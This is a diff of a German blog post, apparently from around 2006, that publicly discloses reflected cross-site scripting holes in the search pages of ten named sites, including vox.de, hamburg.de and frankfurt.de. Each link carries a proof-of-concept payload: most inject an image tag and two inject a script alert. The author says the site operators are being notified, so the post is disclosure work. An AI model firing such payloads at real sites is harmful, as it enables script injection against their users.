@@ -1,27 +1,14 @@
 <html><body><p>Nachdem sich bis jetzt keiner auf meine Mail von vor 3 Tagen gemeldet hat, in der ich ein paar Seiten der XSS-Angreifbarkeit beschuldigt habe (okay, doch 2 - ein Bounce von t-online und ein "Vielen Dank für ihre Mail" von VRR.de), hier nochmal 10 (in Worten: ZEHN) nette Links, unter anderem ein paar Fernsehsender und einige (viele) Stadt-Portale.<br>
-
 <br>
-
 <a href="http://www.clipfish.de/searchfish.php?action=advanced_video_search&amp;word=%22%3E%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%3E" target="_blank">clipfish.de</a><br>
-
 <a href="http://www.vox.de/index_websuche.php?kw=%27%3E%3Cscript%3Ealert%28%22a%22%29%3C%2Fscript%3E" target="_blank">vox.de</a><br>
-
 <a href="http://www.hr-online.de/website/suche/home/index.jsp?posted=true&amp;mode=2&amp;q=%3Cscript%3Ealert%28%22a%22%29%3C%2Fscript%3E" target="_blank">hr-online.de</a><br>
-
 <a href="http://irc.netsplit.de/networks/listings.php?query=%3Cimg%20src=http://www.german-freakz.net/images/gf-banner.jpg%3E" target="_blank">netsplit.de</a><br>
-
 <a href="http://www.nrw.de/cgi-bin/nrw.cgi?q=%22%3E%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%20/%3E&amp;ok=Suche+starten" target="_blank">nrw.de</a><br>
-
 <a href="http://www.koeln.de/ausgehen/tk/suche.php?suchtext=%22%3E%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%3E&amp;zeitraum=woche&amp;suchen=Los" target="_blank">koeln.de</a><br>
-
 <a href="http://hamburg.de/suche.do?schnellsuche=%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki/skins/trustme/23c3-logo.png%22%3E" target="_blank">hamburg.de</a><br>
-
 <a href="http://mainz.de/WGAPublisher/online/html/default/hpkr-5xrncz.de.html?query=%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki//skins/trustme/23c3-logo.png%22%3E" target="_blank">mainz.de</a><br>
-
 <a href="http://www.mannheim.de/io2/browseSearch_do.doB?search=%27%3E%3Cimg%20src=%22http://events.ccc.de/congress/2006-mediawiki/skins/trustme/23c3-logo.png%22%3E" target="_blank">mannheim.de</a><br>
-
 <a href="http://frankfurt.de/sixcms/detail.php?id=stadtfrankfurt_eval01.c.123086.de&amp;_myvars%5B_id_listenartikel%5D=stadtfrankfurt_eval01.c.1806768.de&amp;_sprache=de&amp;_searchvars%5B_vtSearchmode%5D=fulltext_all&amp;_searchvars%5B_vtSuchwoerter%5D=--%3E+%3Cimg+src%3D%22http%3A%2F%2Fevents.ccc.de%2Fcongress%2F2006-mediawiki%2F%2Fskins%2Ftrustme%2F23c3-logo.png%22%3E&amp;suchbutton.x=11&amp;suchbutton.y=6" target="_blank">frankfurt.de</a><br>
-
 <br>
-
 Wie auch beim letzten Mal werde ich eine passende Mail an die Betreiber der Seiten schicken, und hoffe diesmal auf etwas mehr Reaktion.</p></body></html>
